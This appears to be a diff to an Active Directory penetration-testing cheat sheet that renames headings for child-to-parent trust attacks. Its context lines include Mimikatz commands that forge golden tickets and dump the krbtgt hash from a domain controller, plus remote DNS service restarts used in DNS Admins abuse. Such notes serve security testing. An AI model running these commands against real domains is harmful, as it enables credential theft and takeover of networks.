@@ -9,9 +9,9 @@
     * [Printer Bug](#Printer-bug) 
   * [Constrained Delegation](#Constrained-delegation) 
 * [DNS Admins](#DNS-Admins) 
-* [Enterprise Admins](#Enterprise-Admins) 
-  * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
-  * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)
+* [Child to parent attacks](#Child-to-parent-attacks) 
+  * [Trust tickets](#Trust-tickets)
+  * [Krbtgt hash](#Krbtgt-hash)
 * [Crossforest attacks](#Crossforest-attacks)
   * [Trust flow](#Trust-flow) 
   * [Trust abuse SQL](#Trust-abuse-SQL) 
@@ -302,8 +302,8 @@ Sc \\<dns server> stop dns
 Sc \\<dns server> start dns
 ```
 
-## Enterprise Admins
-### Child to parent - trust tickets
+## Child to parent attacks
+### Trust tickets
 #### Dump trust keys
 Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(
 Look for NTLM hash (second command)
@@ -332,7 +332,7 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain>
 ls \\<servername>\c$ 
 ```
 
-### Child to parent - krbtgt hash
+### Krbtgt hash
 #### Get krbtgt hash from dc
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
